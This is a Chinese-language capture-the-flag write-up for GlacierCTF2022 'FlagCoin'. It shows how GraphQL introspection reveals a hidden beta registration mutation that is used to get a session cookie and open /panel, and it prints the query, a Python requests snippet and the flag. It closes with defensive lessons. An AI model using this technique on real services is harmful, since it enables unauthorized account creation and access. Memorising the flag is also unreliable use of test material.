# GlacierCTF2022 - FlagCoin

## 题目简述

FlagCoin 登录页只展示 `login`，但后端开放 GraphQL introspection。目标是发现未在前端暴露的 beta 注册 mutation，创建账户并访问受签名 cookie 保护的 `/panel`。

## 解题过程

向 `/graphql` 发送标准 `__schema` introspection 查询，在 `Mutation` 类型中除 `login`、`redeem` 外还能看到：

```graphql
register_beta_user(username: String!, password: String!): User
```

选择随机用户名和密码执行该 mutation：

```graphql
mutation Register($username: String!, $password: String!) {
  register_beta_user(username: $username, password: $password) {
    username
  }
}
```

解析器直接创建 MongoDB 用户，并调用 `setUser` 设置签名 `session` cookie。若注册请求没有复用 HTTP session，也可以再调用 `login` 并保存响应 cookie：

```python
session = requests.Session()
session.post(graphql, json={
    "query": login_query,
    "variables": {"username": user, "password": password},
})
page = session.get(base_url + "/panel")
```

Express 的 `/panel` 中间件只检查签名 cookie 是否存在，登录后的页面源码直接包含：

```text
glacierctf{bUy_Th3_d1P_br0h}
```

## 方法总结

隐藏前端按钮不会隐藏 GraphQL schema。若生产环境不需要 introspection，应关闭它；更重要的是，未完成的注册 resolver 不应部署到公开 schema。访问控制还应在每个 resolver 和资源层验证用户权限，而不只是依赖页面路由上的 cookie 存在性检查。
